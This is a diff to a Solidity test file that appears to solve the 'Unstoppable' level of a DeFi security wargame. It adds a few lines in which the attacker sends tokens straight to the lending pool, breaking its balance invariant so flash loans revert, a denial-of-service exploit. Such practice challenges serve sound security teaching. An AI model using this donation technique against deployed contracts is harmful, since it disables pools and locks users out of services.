@@ -60,12 +60,23 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        // 1. if attck works, expectRevert AssertionViolated
+        // 2. if poolBalance != balanceBefore, AssertionViolated occurred
+        // 3. so, need to change balanceBefore in some ways
+        dvt.transfer(
+            address(unstoppableLender),
+            INITIAL_ATTACKER_TOKEN_BALANCE
+        );
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
-        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+        console.log(
+            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
+        );
     }
 
     function validation() internal {
